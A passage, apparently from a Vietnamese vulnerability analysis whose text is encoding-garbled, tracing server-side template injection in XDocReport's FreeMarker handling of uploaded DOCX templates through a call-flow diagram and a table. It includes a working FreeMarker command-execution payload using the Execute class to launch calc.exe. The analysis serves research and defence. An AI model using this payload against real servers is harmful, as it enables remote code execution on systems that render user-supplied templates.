                        this, e, env, "Expression has thrown an unchecked exception; see the cause exception.");
            } else if (e instanceof RuntimeException) {
                throw (RuntimeException) e;
            } else {
                throw new UndeclaredThrowableException(e);
            }
        }
    }
```

![image](https://hackmd.io/_uploads/Hkz_xwQ0ex.png)

![image](https://hackmd.io/_uploads/S1MBxv7Axl.png)

![image](https://hackmd.io/_uploads/S1rf7w7Rxx.png)

![image](https://hackmd.io/_uploads/rk-UQDXRxx.png)

![image](https://hackmd.io/_uploads/HJaI7DXRgg.png)

![image](https://hackmd.io/_uploads/S1QOQD7Rlx.png)

![image](https://hackmd.io/_uploads/SywK7PXRlx.png)

![image](https://hackmd.io/_uploads/BJCqQDX0xe.png)

![image](https://hackmd.io/_uploads/SJ9RmwXCle.png)

luá»“ng thá»±c thi trong hÃ m `visit()` nhÆ° sau

```
visit(Interpolation)                // gá»i accept(...)
 â””â”€ Interpolation.accept(env)
     â””â”€ calculateInterpolatedStringOrMarkup(env)
         â””â”€ expression.eval(env)
             â””â”€ (Ä‘áº¿n _eval) target.eval(env)   // tráº£ TemplateMethodModel (built-in new()/Execute)
                 â””â”€ targetMethod.exec(arguments)  â† exec() thá»±c thi -> cháº¡y `calc` â† ğŸ’¥ SSTI xáº£y ra á»Ÿ Ä‘Ã¢y

```

### TÃ³m táº¯t debug

```
[User uploads DOCX template]
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ XDocReportRegistry.loadReport(...)       â”‚
â”‚  - Nháº­n InputStream (file .docx)         â”‚
â”‚  - XÃ¡c Ä‘á»‹nh TemplateEngineKind=Freemarkerâ”‚
â”‚  - Gá»i createReport(...)                 â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ FreemarkerTemplateEngine.loadTemplate()  â”‚
â”‚  - Gá»i new Template(templateName, Reader,â”‚
â”‚    Configuration)                        â”‚
â”‚  - => FMParser parse ná»™i dung template   â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ FMParser(this, reader, config)           â”‚
â”‚  - Äá»c ná»™i dung file (XML trong DOCX)    â”‚
â”‚  - PhÃ¢n tÃ­ch cÃº phÃ¡p                     â”‚
â”‚    Táº¡o AST (cÃ¢y cÃº phÃ¡p):               â”‚
â”‚    â”œâ”€ TextBlock ("Hello")                â”‚
â”‚    â”œâ”€ DollarVariable (${name})           â”‚
â”‚    â””â”€ FunctionCall (${Runtime.exec(...)})â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Environment env =                       â”‚
â”‚   template.createProcessingEnvironment() â”‚
â”‚ env.process()                            â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Environment.process()                    â”‚
â”‚  - clearCachedValues()                   â”‚
â”‚  - doAutoImportsAndIncludes()            â”‚
â”‚  - visit(getTemplate().getRootTreeNode())â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ visit(TemplateElement node)              â”‚
â”‚  - node.accept(env)                      â”‚
â”‚  - Ghi káº¿t quáº£ ra writer (output stream) â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ Náº¿u node lÃ  ${...}                      â”‚
â”‚  â‡’ ExpressionEvaluator Ä‘Æ°á»£c gá»i         â”‚
â”‚  â‡’ eval() biá»ƒu thá»©c bÃªn trong `${}`     â”‚
â”‚  â‡’ CÃ³ thá»ƒ truy cáº­p method Java náº¿u chÆ°a â”‚
â”‚     bá»‹ sandbox hoáº·c háº¡n cháº¿             â”‚
â”‚  â‡’ VÃ­ dá»¥: ${"freemarker.template.utility.Execute"?new()("calc.exe")} â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
           â”‚
           â–¼
ğŸš¨ **Káº¿t quáº£: Server-Side Template Injection (SSTI)**
```

## ğŸ” **TÃ³m táº¯t cÃ¡c Ä‘iá»ƒm then chá»‘t cÃ³ thá»ƒ khai thÃ¡c**

| Giai Ä‘oáº¡n               | Lá»›p                  | Vai trÃ²              | LiÃªn quan SSTI            |
| ----------------------- | -------------------- | -------------------- | ------------------------- |
| `loadReport()`          | `XDocReportRegistry` | Táº£i template         | KhÃ´ng kiá»ƒm soÃ¡t input     |
| `getReader()`           | `TemplateEngine`     | Äá»c dá»¯ liá»‡u template | CÃ³ thá»ƒ chá»©a payload       |
| `FMParser`              | `freemarker.core`    | Parse ná»™i dung       | Biáº¿n `${}` Ä‘Æ°á»£c phÃ¢n tÃ­ch |
| `Environment.process()` | `freemarker.core`    | Render template      | Gá»i `visit()` tá»«ng node   |
| `visit()` / `eval()`    | `freemarker.core`    | Thá»±c thi biá»ƒu thá»©c   | **Äiá»ƒm SSTI / RCE**       |

---

## TÃ i liá»‡u

- https://drive.google.com/drive/folders/1XYFtxs5O3SMW0FemNMZ_1ft1ueFixhVz?usp=drive_link
